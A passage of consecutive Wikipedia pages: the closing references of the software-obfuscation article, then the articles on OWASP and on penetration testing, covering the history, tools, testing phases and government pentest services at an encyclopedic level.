, 17th National Computer Conference, Sharif University of Technology, Tehran, Iran, 2012.


B. Barak, O. Goldreich, R. Impagliazzo, S. Rudich, A. Sahai, S. Vadhan and K. Yang. 
"On the (Im)possibility of Obfuscating Programs"
. 
21st Annual International Cryptology Conference
, Santa Barbara, California, USA. Springer Verlag LNCS Volume 2139, 2001.


Mateas, Michael; Nick Montfort. 
"A Box, Darkly: Obfuscation, Weird Languages, and Code Aesthetics"
 
(PDF)
. 
Proceedings of the 6th Digital Arts and Culture Conference, IT University of Copenhagen, 1–3 December 2005
. pp. 144–153. 
Archived
 
(PDF)
 from the original on June 23, 2008
. Retrieved 
June 28,
 2008
.




External links
[
edit
]


The International Obfuscated C Code Contest


Protecting Java Code Via Code Obfuscation
, ACM Crossroads, Spring 1998 issue


Can we obfuscate programs?


Yury Lifshits. Lecture Notes on Program Obfuscation (Spring'2005)


‹ The 
template
 below (
Curlie
) is being considered for deletion. See 
templates for discussion
 to help reach a consensus. ›
Java obfuscators
 at 
Curlie


c2:BlackBoxComputation


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Obfuscation_(software)&oldid=1240704330
"


Categories
: 
Software obfuscation
Source code
Program transformation
Hidden categories: 
CS1 maint: numeric names: authors list
CS1 errors: missing periodical
Use American English from March 2019
All Wikipedia articles written in American English
Articles with short description
Short description is different from Wikidata
Use mdy dates from March 2019
Articles to be expanded from March 2023
All articles to be expanded
Articles with Curlie links









Coordinates
: 
39°44′47″N
 
75°33′03″W
﻿ / ﻿
39.746343°N 75.5508357°W
﻿ / 
39.746343; -75.5508357




From Wikipedia, the free encyclopedia






Computer security organization


 A major contributor to this article appears to have a 
close connection
 with its subject.
 It may require cleanup to comply with Wikipedia's content policies, particularly 
neutral point of view
. Please discuss further on the 
talk page
.
 
(
December 2022
)
 (
Learn how and when to remove this message
)


OWASP
Types
501(c)(3)
 
nonprofit organization
Focus
Web security, application security, vulnerability assessment
Coordinates
39°44′47″N
 
75°33′03″W
﻿ / ﻿
39.746343°N 75.5508357°W
﻿ / 
39.746343; -75.5508357
 
Method
Industry standards, conferences, workshops
Revenue
 $2.3 million
[
1
]
Website
owasp
.org
 




The 
Open Worldwide Application Security Project
 
[
7
]
 (
OWASP
) is an online community that produces freely available articles, methodologies, documentation, tools, and technologies in the fields of 
IoT
, system software and 
web application security
.
[
8
]
[
9
]
[
10
]
 The OWASP provides free and open resources. It is led by a non-profit called The OWASP Foundation. The OWASP Top 10 - 2021 is the published result of recent research based on comprehensive data compiled from over 40 partner organizations.





History
[
edit
]


Mark Curphey started OWASP on September 9, 2001.
[
2
]
 Jeff Williams served as the volunteer Chair of OWASP from late 2003 until September 2011. As of 2015
[update]
, Matt Konda chaired the Board.
[
11
]


The OWASP Foundation, a 501(c)(3) non-profit organization in the US established in 2004, supports the OWASP infrastructure and projects. Since 2011, OWASP is also registered as a non-profit organization in Belgium under the name of OWASP Europe VZW.
[
12
]


In February 2023, it was reported by Bil Corry, a OWASP Foundation Global Board of Directors officer,
[
13
]
 on Twitter
[
7
]
 that the board had voted for renaming from the Open Web Application Security Project to its current name, replacing Web with Worldwide.



Publications and resources
[
edit
]


OWASP Top Ten: The "Top Ten", first published in 2003, is regularly updated.
[
14
]
 It aims to raise awareness about application security by identifying some of the most critical risks facing organizations.
[
15
]
[
16
]
[
17
]
 Many standards, books, tools, and many organizations reference the Top 10 project, including MITRE, 
PCI DSS
,
[
18
]
 the 
Defense Information Systems Agency
 (
DISA-STIG
), and the United States 
Federal Trade Commission
 (FTC),
[
19
]
[
20
]


OWASP Software Assurance Maturity Model: The 
Software Assurance Maturity Model (SAMM)
 project's mission is to provide an effective and measurable way for all types of organizations to analyze and improve their software security posture. A core objective is to raise awareness and educate organizations on how to design, develop, and deploy secure software through a flexible self-assessment model. SAMM supports the complete software lifecycle and is technology and process agnostic. The SAMM model is designed to be evolutive and risk-driven in nature, acknowledging there is no single recipe that works for all organizations.
[
21
]


OWASP Development Guide: The Development Guide provides practical guidance and includes J2EE, ASP.NET, and PHP code samples. The Development Guide covers an extensive array of application-level security issues, from  SQL injection through modern concerns such as phishing, credit card handling, session fixation, cross-site request forgeries, compliance, and privacy issues.


OWASP Testing Guide: The OWASP Testing Guide includes a "best practice" penetration testing framework that users can implement in their own organizations and a "low level" penetration testing guide that describes techniques for testing most common web application and web service security issues. Version 4 was published in September 2014, with input from 60 individuals.
[
22
]


OWASP Code Review Guide: The code review guide is currently at release version 2.0, released in July 2017.


OWASP Application Security Verification Standard (ASVS): A standard for performing application-level security verifications.
[
23
]


OWASP XML Security Gateway (XSG) Evaluation Criteria Project.
[
24
]


OWASP Top 10 Incident Response Guidance. This project provides a proactive approach to Incident Response planning. The intended audience of this document includes business owners to security engineers, developers, audit, program managers, law enforcement & legal council.
[
25
]


OWASP ZAP Project: The Zed Attack Proxy (ZAP)
 is an easy to use integrated penetration testing tool for finding vulnerabilities in web applications. It is designed to be used by people with a wide range of security experience including developers and functional testers who are new to penetration testing.


Webgoat: a deliberately insecure web application created by OWASP as a guide for secure programming practices.
[
2
]
 Once downloaded, the application comes with a tutorial and a set of different lessons that instruct students how to exploit vulnerabilities with the intention of teaching them how to write code securely.


OWASP AppSec Pipeline: The 
Application Security
 (AppSec) Rugged 
DevOps
 Pipeline Project is a place to find information needed to increase the speed and automation of an application security program. AppSec Pipelines take the principles of DevOps and Lean and applies that to an application security program.
[
26
]


OWASP 
Automated Threats
 to Web Applications: Published July 2015
[
27
]
 - the OWASP Automated Threats to Web Applications Project aims to provide definitive information and other resources for architects, developers, testers and others to help defend against automated threats such as 
credential stuffing
. The project outlines the top 20 automated threats as defined by OWASP.
[
28
]


OWASP API Security Project: focuses on strategies and solutions to understand and mitigate the unique vulnerabilities and security risks of Application Programming Interfaces (APIs). Includes the most recent list API Security Top 10 2023.
[
29
]


Awards
[
edit
]


The OWASP organization received the 2014 
Haymarket Media Group
 
SC Magazine
 Editor's Choice award.
[
9
]
[
30
]




See also
[
edit
]


Open Source Security Foundation


References
[
edit
]






^
 
"OWASP FOUNDATION INC"
. 
Nonprofit Explorer
. 
ProPublica
. May 9, 2013
. Retrieved 
January 8,
 2020
.




^ 
a
 
b
 
c
 
d
 
Huseby, Sverre (2004). 
Innocent Code: A Security Wake-Up Call for Web Programmers
. Wiley. p. 
203
. 
ISBN
 
0470857447
.




^
 
"OWASP Foundation Staff"
. OWASP. February 12, 2023
. Retrieved 
May 3,
 2022
.




^
 
"OWASP Foundation Global Board"
. OWASP. February 14, 2023
. Retrieved 
March 20,
 2023
.




^
 
"OWASP Foundation's Form 990 for fiscal year ending Dec. 2017"
. October 26, 2018
. Retrieved 
January 8,
 2020
 – via ProPublica Nonprofit Explorer.




^
 
"OWASP Foundation's Form 990 for fiscal year ending Dec. 2020"
. October 29, 2021
. Retrieved 
January 18,
 2023
 – via ProPublica Nonprofit Explorer.




^ 
a
 
b
 
Corry, Bil [@bilcorry] (February 25, 2023). 
"A change you might notice about @owasp , the Board voted to change the "W" from "Web" to "Worldwide", making it the "Open Worldwide Application Security Project"
"
 (
Tweet
)
. Retrieved 
July 7,
 2024
 – via 
Twitter
.




^
 
"OWASP top 10 vulnerabilities"
. 
developerWorks
. IBM. April 20, 2015
. Retrieved 
November 28,
 2015
.




^ 
a
 
b
 
"SC Magazine Awards 2014"
 
(PDF)
. Media.scmagazine.com. Archived from 
the original
 
(PDF)
 on September 22, 2014
. Retrieved 
November 3,
 2014
.




^
 
"OWASP Internet of Things"
. Retrieved 
December 26,
 2023
.




^
 
"Board"
. 
OWASP
. Archived from 
the original
 on September 16, 2017
. Retrieved 
February 27,
 2015
.




^
 
"OWASP Europe"
. 
OWASP
. Archived from 
the original
 on April 17, 2016
. Retrieved 
July 7,
 2024
.




^
 
"Global Board"
. 
owasp.org
. 
Archived
 from the original on April 29, 2024
. Retrieved 
July 7,
 2024
.




^
 
"OWASP Top Ten"
. 
owasp.org
. 
Archived
 from the original on July 6, 2024
. Retrieved 
July 7,
 2024
.




^
 
Trevathan, Matt (October 1, 2015). 
"Seven Best Practices for Internet of Things"
. 
Database and Network Journal
. Archived from 
the original
 on November 28, 2015.




^
 
Crosman, Penny (July 24, 2015). 
"Leaky Bank Websites Let Clickjacking, Other Threats Seep In"
. 
American Banker
. Archived from 
the original
 on November 28, 2015.




^
 
Pauli, Darren (December 4, 2015). 
"Infosec bods rate app languages; find Java 'king', put PHP in bin"
. 
The Register
. Retrieved 
December 4,
 2015
.




^
 
"Payment Card Industry (PCI) Data Security Standard"
 
(PDF)
. PCI Security Standards Council. November 2013. p. 55
. Retrieved 
December 3,
 2015
.




^
 


"Open Web Application Security Project Top 10 (OWASP Top 10)"
. Knowledge Database. 
Synopsys
. Synopsys, Inc. 2017
. Retrieved 
July 20,
 2017
. 
Many entities including the PCI Security Standards Council, National Institute of Standards and Technology (NIST), and the Federal Trade Commission (FTC) regularly reference the OWASP Top 10 as an integral guide for mitigating Web application vulnerabilities and meeting compliance initiatives.




^
 
"Authorization remains #1 issue - OWASP 2023 Top 10 List"
. 
Cerbos
. Retrieved 
September 2,
 2024
.




^
 
"What is OWASP SAMM?"
. 
OWASP SAMM
. Retrieved 
November 6,
 2022
.




^
 
Pauli, Darren (September 18, 2014). 
"Comprehensive guide to obliterating web apps published"
. 
The Register
. Retrieved 
November 28,
 2015
.




^
 
Baar, Hans; Smulters, Andre; Hintzbergen, Juls; Hintzbergen, Kees (2015). 
Foundations of Information Security Based on ISO27001 and ISO27002
 (3 ed.). Van Haren. p. 144. 
ISBN
 
9789401800129
.




^
 
"Category:OWASP XML Security Gateway Evaluation Criteria Project Latest"
. Owasp.org. Archived from 
the original
 on November 3, 2014
. Retrieved 
November 3,
 2014
.




^
 
"OWASP Incident Response Project - OWASP"
. Archived from 
the original
 on April 6, 2019
. Retrieved 
December 12,
 2015
.




^
 
"OWASP AppSec Pipeline"
. 
Open Web Application Security Project (OWASP)
. Archived from 
the original
 on January 18, 2020
. Retrieved 
February 26,
 2017
.




^
 
"AUTOMATED THREATS to Web applications"
 
(PDF)
. OWASP. July 2015.




^
 


"OWASP Automated Threats to Web Applications"
. 
owasp.org
. 
Archived
 from the original on June 29, 2024
. Retrieved 
July 7,
 2024
.




^
 
"OWASP API Security Project - OWASP Foundation"
. 
OWASP
.




^
 


"Winners | SC Magazine Awards"
. Awards.scmagazine.com. Archived from 
the original
 on August 20, 2014
. Retrieved 
July 17,
 2014
. 
Editor's Choice [...] Winner: OWASP Foundation






External links
[
edit
]


Official website


Authority control databases
 
International
VIAF
National
Germany
United States










Retrieved from "
https://en.wikipedia.org/w/index.php?title=OWASP&oldid=1244232214
"


Categories
: 
Computer security organizations
Computer standards
501(c)(3) organizations
Non-profit organisations based in Belgium
Organizations established in 2001
2001 establishments in Belgium
Hidden categories: 
Pages using gadget WikiMiniAtlas
Articles with short description
Short description matches Wikidata
Wikipedia articles with possible conflicts of interest from December 2022
Coordinates on Wikidata
Pages using infobox organization with unknown parameters
Use mdy dates from August 2012
Articles containing potentially dated statements from 2015
All articles containing potentially dated statements











From Wikipedia, the free encyclopedia






Authorized cyberattack for testing purposes


This article is about testing of computer systems. For testing of geotechnical properties of soil, see 
Standard penetration test
.


This article's 
lead section
 may be too long
.
 Please read the 
length guidelines
 and help 
move details into the article's body
.
 
(
December 2021
)


A 
penetration test
, colloquially known as a 
pentest
, is an authorized simulated 
cyberattack
 on a computer system, performed to evaluate the 
security
 of the system;
[
1
]
 this is not to be confused with a 
vulnerability assessment
.
[
2
]
 The test is performed to identify weaknesses (or 
vulnerabilities
), including the potential for unauthorized parties to gain access to the system's features and data,
[
3
]
[
4
]
 as well as strengths,
[
5
]
 enabling a full 
risk assessment
 to be completed.

The process typically identifies the target systems and a particular goal, then reviews available information and undertakes various means to attain that goal. A penetration test target may be a 
white box
 (about which background and system information are provided in advance to the tester) or a 
black box
 (about which only basic information other than the company name is provided). A 
gray box
 penetration test is a combination of the two (where limited knowledge of the target is shared with the auditor).
[
6
]
 A penetration test can help identify a system's vulnerabilities to attack and estimate how vulnerable it is.
[
7
]
[
5
]


Security issues that the penetration test uncovers should be reported to the system owner.
[
8
]
 Penetration test reports may also assess potential impacts to the organization and suggest countermeasures to reduce the risk.
[
8
]


The UK 
National Cyber Security Center
 describes penetration testing as: "A method for gaining assurance in the security of an IT system by attempting to breach some or all of that system's security, using the same tools and techniques as an adversary might."
[
9
]


The goals of a penetration test vary depending on the type of approved activity for any given engagement, with the primary goal focused on finding vulnerabilities that could be exploited by a nefarious actor, and informing the client of those vulnerabilities along with recommended mitigation strategies.
[
10
]


Penetration tests are a component of a full 
security audit
. For example, the 
Payment Card Industry Data Security Standard
 requires penetration testing on a regular schedule, and after system changes.
[
11
]
 Penetration testing also can support risk assessments as outlined in the  NIST Risk Management Framework SP 800-53.
[
12
]


Several standard frameworks and methodologies exist for conducting penetration tests. These include the Open Source Security Testing Methodology Manual (OSSTMM), the Penetration Testing Execution Standard (PTES), the 
NIST
 Special Publication 800-115, the Information System Security Assessment Framework (ISSAF) and the 
OWASP
 Testing Guide. CREST, a not for profit professional body for the technical cyber security industry, provides its CREST Defensible Penetration Test standard that provides the industry with guidance for commercially reasonable assurance activity when carrying out penetration tests.
[
13
]


Flaw hypothesis methodology is a 
systems analysis
 and penetration prediction technique where a list of hypothesized 
flaws
 in a 
software system
 are compiled through analysis of the 
specifications
 and documentation for the system. The list of hypothesized flaws is then prioritized on the basis of the estimated probability that a flaw actually exists, and on the ease of exploiting it to the extent of control or compromise. The prioritized list is used to direct the actual testing of the system.

There are different types of penetration testing, depending upon the goal of the organization which include: Network (external and internal), Wireless, Web Application, Social Engineering, and Remediation Verification.





History
[
edit
]


By the mid 1960s, growing popularity of 
time-sharing
 computer systems that made resources accessible over communication lines created new security concerns. As the scholars Deborah Russell and G. T. Gangemi Sr. explain, "The 1960s marked the true beginning of the age of computer security."
[
14
]
: 27 


In June 1965, for example, several of the U.S.'s leading computer security experts held one of the first major conferences on system security—hosted by the government contractor, the 
System Development Corporation
 (SDC). During the conference, someone noted that one SDC employee had been able to easily undermine various system safeguards added to SDC's 
AN/FSQ-32
 time-sharing computer system. In hopes that further system security study would be useful, attendees requested "...studies to be conducted in such areas as breaking security protection in the time-shared system." In other words, the conference participants initiated one of the first formal requests to use computer penetration as a tool for studying system security.
[
15
]
: 7–8 


At the Spring 1967 Joint Computer Conference, many leading computer specialists again met to discuss system security concerns. During this conference, the computer security experts 
Willis Ware
, Harold Petersen, and Rein Turn, all of the 
RAND Corporation
, and Bernard Peters of the 
National Security Agency
 (NSA), all used the phrase "penetration" to describe an attack against a computer system. In a paper, Ware referred to the military's remotely accessible time-sharing systems, warning that "Deliberate attempts to penetrate such computer systems must be anticipated." His colleagues Petersen and Turn shared the same concerns, observing that online communication systems "...are vulnerable to threats to privacy," including "deliberate penetration." Bernard Peters of the NSA made the same point, insisting that computer input and output "...could provide large amounts of information to a penetrating program." During the conference, computer penetration would become formally identified as a major threat to online computer systems.
[
15
]
: 8 


The threat that computer penetration posed was next outlined in a major report organized by the 
United States Department of Defense
 (DoD) in late 1967. Essentially, DoD officials turned to Willis Ware to lead a task force of experts from NSA, 
CIA
, DoD, academia, and industry to formally assess the security of time-sharing computer systems. By relying on many papers presented during the Spring 1967 Joint Computer Conference, the task force largely confirmed the threat to system security that computer penetration posed. Ware's report was initially classified, but many of the country's leading computer experts quickly identified the study as the definitive document on computer security.
[
15
]
 Jeffrey R. Yost of the 
Charles Babbage Institute
 has more recently described the Ware report as "...by far the most important and thorough study on technical and operational issues regarding secure computing systems of its time period."
[
16
]
 In effect, the Ware report reaffirmed the major threat posed by computer penetration to the new online time-sharing computer systems.

To better understand system weaknesses, the federal government and its contractors soon began organizing teams of penetrators, known as 
tiger teams
,
 to use computer penetration to test system security. Deborah Russell and G. T. Gangemi Sr. stated that during the 1970s "...'tiger teams' first emerged on the computer scene. Tiger teams were government and industry-sponsored teams of crackers who attempted to break down the defenses of computer systems in an effort to uncover, and eventually patch, security holes."
[
14
]
: 29 


A leading scholar on the history of computer security, Donald MacKenzie, similarly points out that, "RAND had done some penetration studies (experiments in circumventing computer security controls) of early time-sharing systems on behalf of the government."
[
17
]
[
18
]
 Jeffrey R. Yost of the Charles Babbage Institute, in his own work on the history of computer security, also acknowledges that both the RAND Corporation and the SDC had "engaged in some of the first so-called 'penetration studies' to try to infiltrate time-sharing systems in order to test their vulnerability."
[
16
]
 In virtually all these early studies, tiger teams successfully broke into all targeted computer systems, as the country's time-sharing systems had poor defenses.

Of early tiger team actions, efforts at the RAND Corporation demonstrated the usefulness of penetration as a tool for assessing system security. At the time, one RAND analyst noted that the tests had "...demonstrated the practicality of system-penetration as a tool for evaluating the effectiveness and adequacy of implemented data security safeguards." In addition, a number of the RAND analysts insisted that the penetration test exercises all offered several benefits that justified its continued use. As they noted in one paper, "A penetrator seems to develop a diabolical frame of mind in his search for operating system weaknesses and incompleteness, which is difficult to emulate." For these reasons and others, many analysts at RAND recommended the continued study of penetration techniques for their usefulness in assessing system security.
[
15
]
: 9 


Presumably the leading computer penetration expert during these formative years was James P. Anderson, who had worked with the NSA, RAND, and other government agencies to study system security. In the early 1971, the U.S. Air Force contracted Anderson's private company to study the security of its time-sharing system at the Pentagon. In his study, Anderson outlined a number of major factors involved in computer penetration. Anderson described a general attack sequence in steps:



Find an exploitable vulnerability.


Design an attack around it.


Test the attack.


Seize a line in use.


Enter the attack.


Exploit the entry for information recovery.


Over time, Anderson's description of general computer penetration steps helped guide many other security experts, who relied on this technique to assess time-sharing computer system security.
[
15
]
: 9 


In the following years, computer penetration as a tool for security assessment became more refined and sophisticated. In the early 1980s, the journalist 
William Broad
 briefly summarized the ongoing efforts of tiger teams to assess system security. As Broad reported, the DoD-sponsored report by Willis Ware had "...showed how spies could actively penetrate computers, steal or copy electronic files and subvert the devices that normally guard top-secret information. The study touched off more than a decade of quiet activity by elite groups of computer scientists working for the Government who tried to break into sensitive computers. They succeeded in every attempt."
[
19
]


While these various studies may have suggested that computer security in the U.S. remained a major problem, the scholar Edward Hunt has more recently made a broader point about the extensive study of computer penetration as a security tool. Hunt suggests in a recent paper on the history of penetration testing that the defense establishment ultimately "...created many of the tools used in modern day cyberwarfare," as it carefully defined and researched the many ways that computer penetrators could hack into targeted systems.
[
15
]
: 5 




Tools
[
edit
]


A wide variety of 
security assessment tools
 are available to assist with penetration testing, including free-of-charge, 
free software
, and 
commercial software
.



Specialized OS distributions
[
edit
]


Several operating system distributions are geared towards penetration testing.
[
20
]
 Such distributions typically contain a pre-packaged and pre-configured set of tools. The penetration tester does not have to hunt down each individual tool, which might increase the risk of complications—such as compile errors, dependency issues, and configuration errors. Also, acquiring additional tools may not be practical in the tester's context.

Notable penetration testing OS examples include:



BlackArch
 based on 
Arch Linux


BackBox
 based on 
Ubuntu


Kali Linux
 (replaced 
BackTrack
 December 2012) based on 
Debian


Parrot Security OS
 based on 
Debian


Pentoo
 based on 
Gentoo


WHAX
 based on 
Slackware


Many other specialized operating systems facilitate penetration testing—each more or less dedicated to a specific field of penetration testing.

A number of Linux distributions include known OS and application vulnerabilities, and can be deployed as 
targets
 to practice against. Such systems help new security professionals try the latest security tools in a lab environment. Examples include Damn Vulnerable Linux (DVL), the OWASP Web Testing Environment (WTW), and Metasploitable.



Software frameworks
[
edit
]


BackBox


Hping


Metasploit Project


Nessus


Nmap


OWASP ZAP


SAINT


w3af


Burp Suite


Wireshark


John the Ripper


Hashcat


Penetration testing phases
[
edit
]


The process of penetration testing may be simplified into the following five phases:



Reconnaissance: The act of gathering important information on a target system. This information can be used to better attack the target. For example, open source search engines can be used to find data that can be used in a 
social engineering
 attack.


Scanning: Uses technical tools to further the attacker's knowledge of the system. For example, 
Nmap
 can be used to scan for open ports.


Gaining access: Using the data gathered in the reconnaissance and scanning phases, the attacker can use a payload to exploit the targeted system. For example, Metasploit can be used to automate attacks on known vulnerabilities.


Maintaining access: Maintaining access requires taking the steps involved in being able to be persistently within the target environment in order to gather as much data as possible.


Covering tracks: The attacker must clear any trace of compromising the victim system, any type of data gathered, log events, in order to remain anonymous.
[
21
]


Once an attacker has exploited one vulnerability they may gain access to other machines so the process repeats i.e. they look for new vulnerabilities and attempt to exploit them. This process is referred to as pivoting.



Vulnerabilities
[
edit
]


Legal operations that let the tester execute an illegal operation include unescaped SQL commands, unchanged hashed passwords in source-visible projects, human relationships, and old hashing or cryptographic functions. A single flaw may not be enough to enable a critically serious exploit. Leveraging multiple known flaws and shaping the payload in a way that appears as a valid operation is almost always required. Metasploit provides a ruby library for common tasks, and maintains a database of known exploits.

When working under budget and time constraints, 
fuzzing
 is a common technique that discovers vulnerabilities. It aims to get an unhandled error through random input. The tester uses random input to access the less often used code paths. Well-trodden code paths are usually free of errors. Errors are useful because they either expose more information, such as HTTP server crashes with full info trace-backs—or are directly usable, such as 
buffer overflows
.

Imagine a website has 100 text input boxes. A few are vulnerable to 
SQL injections
 on certain strings. Submitting random strings to those boxes for a while will hopefully hit the bugged code path. The error shows itself as a broken HTML page half rendered because of an SQL error. In this case, only text boxes are treated as input streams. However, software systems have many possible input streams, such as cookie and session data, the uploaded file stream, RPC channels, or memory. Errors can happen in any of these input streams. The test goal is to first get an unhandled error and then understand the flaw based on the failed test case. Testers write an automated tool to test their understanding of the flaw until it is correct. After that, it may become obvious how to package the payload so that the target system triggers its execution. If this is not viable, one can hope that another error produced by the fuzzer yields more fruit. The use of a fuzzer saves time by not checking adequate code paths where exploits are unlikely.



Payload
[
edit
]


The illegal operation, or payload in Metasploit terminology, can include functions for logging keystrokes, taking screenshots, installing 
adware
, stealing credentials, creating backdoors using 
shellcode
, or altering data. Some companies maintain large databases of known exploits and provide products that automatically test target systems for vulnerabilities:



Metasploit


Nessus


Nmap


OpenVAS


W3af


Standardized government penetration test services
[
edit
]


The 
General Services Administration
 (GSA) has standardized the "penetration test" service as a pre-vetted support service, to rapidly address potential vulnerabilities, and stop adversaries before they impact US federal, state and local governments. These services are commonly referred to as Highly Adaptive Cybersecurity Services (HACS) and are listed at the US GSA Advantage website.
[
22
]


This effort has identified key service providers which have been technically reviewed and vetted to provide these advanced penetration services.  This GSA service is intended to improve the rapid ordering and deployment of these services, reduce US government contract duplication, and to protect and support the US infrastructure in a more timely and efficient manner.

132-45A Penetration Testing
[
23
]
 is security testing in which service assessors mimic real-world attacks to identify methods for circumventing the security features of an application, system, or network. HACS Penetration Testing Services typically strategically test the effectiveness of the organization's preventive and detective security measures employed to protect assets and data. As part of this service, certified ethical hackers typically conduct a simulated attack on a system, systems, applications or another target in the environment, searching for security weaknesses. After testing, they will typically document the vulnerabilities and outline which defenses are effective and which can be defeated or exploited.

In the UK penetration testing services are standardized via professional bodies working in collaboration with National Cyber Security Centre.

The outcomes of penetration tests vary depending on the standards and methodologies used. There are five penetration testing standards: Open Source Security Testing Methodology Manual
[
24
]
 (OSSTMM), 
Open Web Application Security Project
 (OWASP), 
National Institute of Standards and Technology
 (NIST00), Information System Security Assessment Framework (ISSAF), and Penetration Testing Methodologies and Standards (PTES).



See also
[
edit
]


IT risk


ITHC


Tiger team


White hat (computer security)


Breach attack simulation


Damn Vulnerable Web Application


General references
[
edit
]


The Definitive Guide to Penetration Testing
[
25
]


Advanced Penetration Testing: Hacking the World's Most Secure Networks 
[
26
]


The Hacker Playbook 3: Practical Guide To Penetration Testing
[
27
]


Penetration Testing
[
28
]


References
[
edit
]






^
 
"What Is Penetration Testing?"
. Retrieved 
2018-12-18
.




^
 
"What's the difference between a vulnerability assessment and a penetration test?"
. Retrieved 
2020-05-21
.




^
 
The CISSP® and CAPCM Prep Guide: Platinum Edition
. John Wiley & Sons. 2006-11-06. 
ISBN
 
978-0-470-00792-1
. 
A penetration test can determine how a system reacts to an attack, whether or not a system's defenses can be breached, and what information can be acquired from the system




^
 
Kevin M. Henry (2012). 
Penetration Testing: Protecting Networks and Systems
. IT Governance Ltd. 
ISBN
 
978-1-849-28371-7
. 
Penetration testing is the simulation of an attack on a system, network, piece of equipment or other facility, with the objective of proving how vulnerable that system or "target" would be to a real attack.




^ 
a
 
b
 
Cris Thomas (Space Rogue), Dan Patterson (2017). 
Password Cracking is easy with IBM's Space Rogue
 (Video). 
CBS Interactive
.  Event occurs at 4:30-5:30
. Retrieved 
1 December
 2017
.




^
 
"Pen Testing Types explained"
. 2017-06-09
. Retrieved 
2018-10-23
.




^
 
"Penetration Testing: Assessing Your Overall Security Before Attackers Do"
 
(pdf)
. 
SANS Institute
. Archived from 
the original
 on February 27, 2014
. Retrieved 
16 January
 2014
.




^ 
a
 
b
 
"Writing a Penetration Testing Report"
. 
SANS Institute
. Retrieved 
12 January
 2015
.




^
 
"Penetration Testing"
. 
NCSC
. Aug 2017
. Retrieved 
30 October
 2018
.




^
 
Patrick Engebretson, 
The basics of hacking and penetration testing
 
Archived
 2017-01-04 at the 
Wayback Machine
, Elsevier, 2013




^
 
Alan Calder and Geraint Williams (2014). 
PCI DSS: A Pocket Guide, 3rd Edition
. IT Governance Limited. 
ISBN
 
978-1-84928-554-4
. 
network vulnerability scans at least quarterly and after any significant change in the network




^
 
"NIST Risk Management Framework"
. 
NIST
. 2020. Archived from 
the original
 on May 6, 2021.




^
 
"CREST releases guidance on penetration testing"
. 
IntelligentCISO
. 2022.




^ 
a
 
b
 
Russell, Deborah; Gangemi, G.T. (1991). 
Computer Security Basics
. O'Reilly Media Inc. 
ISBN
 
9780937175712
.




^ 
a
 
b
 
c
 
d
 
e
 
f
 
Hunt, Edward (2012). "US Government Computer Penetration Programs and the Implications for Cyberwar". 
IEEE Annals of the History of Computing
. 
34
 (3): 4–21. 
doi
:
10.1109/MAHC.2011.82
. 
S2CID
 
16367311
.




^ 
a
 
b
 
Yost, Jeffrey R. (2007). de Leeuw, Karl; Bergstra, Jan (eds.). 
A History of Computer Security Standards
, in The History of Information Security: A Comprehensive Handbook
. Elsevier. pp. 601–602.




^
 
Mackenzie, Donald; Pottinger, Garrel (1997). 
"Mathematics, Technology, and Trust: Formal Verification, Computer Security, and the U.S. Military"
. 
IEEE Annals of the History of Computing
. 
19
 (3): 41–59. 
doi
:
10.1109/85.601735
.




^
 
Mackenzie, Donald A. (2004). 
Mechanizing Proof: Computing, Risk, and Trust
. 
Massachusetts Institute of Technology
. p. 156. 
ISBN
 
978-0-262-13393-7
.




^
 
Broad, William J. (September 25, 1983). "Computer Security Worries Military Experts", 
The New York Times




^
 
Faircloth, Jeremy (2011). 
"Chapter 1:Tools of the Trade"
 
(PDF)
. 
Penetration Tester's Open Source Toolkit
 (Third ed.). 
Elsevier
. 
ISBN
 
978-1597496278
. Retrieved 
4 January
 2018
.
[
need quotation to verify
]




^
 
"Summarizing The Five Phases of Penetration Testing - Cybrary"
. 
Cybrary
. 2015-05-06. Archived from 
the original
 on April 8, 2019
. Retrieved 
2018-06-25
.




^
 
"GSA HACS SIN 132-45 Services"
. 1 March 2018. Archived from 
the original
 on 23 March 2019
. Retrieved 
1 March
 2018
.




^
 
"Pen Testing Services"
. 1 March 2018. Archived from 
the original
 on 26 June 2018
. Retrieved 
1 March
 2018
.




^
 
"Open-Source Security Testing Methodology Manual - an overview | ScienceDirect Topics"
. 
www.sciencedirect.com
. Retrieved 
2021-10-13
.




^
 
"Definitive Guide to Penetration Testing | Core Sentinel"
. 
Core Sentinel
. Retrieved 
2018-10-23
.




^
 
Allsopp, Wil (2017). 
Advanced penetration testing: hacking the world's most secure networks
. Indianapolis, IN: Wiley. 
ISBN
 
978-1-119-36768-0
.




^
 
Kim, Peter (2018). 
The Hacker Playbook 3: Practical Guide To Penetration Testing
 (3rd ed.). United States: Secure Planet LLC. 
ISBN
 
978-1-9809-0175-4
.




^
 
Weidman, Georgia (2014). 
Penetration testing: a hands-on introduction to hacking
. San Francisco: No Starch Press. 
ISBN
 
978-1-59327-564-8
.






Authority control databases
: National 
United States
Latvia
Israel










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Penetration_test&oldid=1238071847
"


Categories
: 
Security testing
Computer network security
Software testing
Hidden categories: 
Webarchive template wayback links
Wikipedia articles needing factual verification from May 2013
Articles with short description
Short description is different from Wikidata
Wikipedia introduction cleanup from December 2021
All pages needing cleanup
Articles covered by WikiProject Wikify from December 2021
All articles covered by WikiProject Wikify
Use American English from January 2014
All Wikipedia articles written in American English











From Wikipedia, the free encyclopedia






